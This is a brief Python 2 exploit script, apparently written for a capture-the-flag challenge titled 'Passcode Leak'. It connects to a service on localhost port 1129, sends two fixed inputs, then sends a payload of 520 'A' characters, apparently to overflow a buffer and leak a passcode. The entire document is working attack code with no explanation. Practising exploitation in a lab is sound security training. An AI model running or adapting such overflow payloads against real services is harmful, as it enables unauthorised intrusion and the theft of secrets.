from struct import *
from socket import *
from time import *

p = lambda x : pack("<L", x)
up = lambda x : unpack("<L",x)[0]

print "=============== [ Passcode Leak ] ==============="
s = socket(AF_INET, SOCK_STREAM)
s.connect(("localhost", 1129))

print s.recv(1024)
print s.recv(1024)
s.send("target" + "\n")
sleep(1)

print s.recv(1024)
s.send("1.1/1.1" + "\n")
sleep(1)
print s.recv(1024)

s.send("A"*520+"\n")
sleep(1)
print s.recv(1024)
s.close()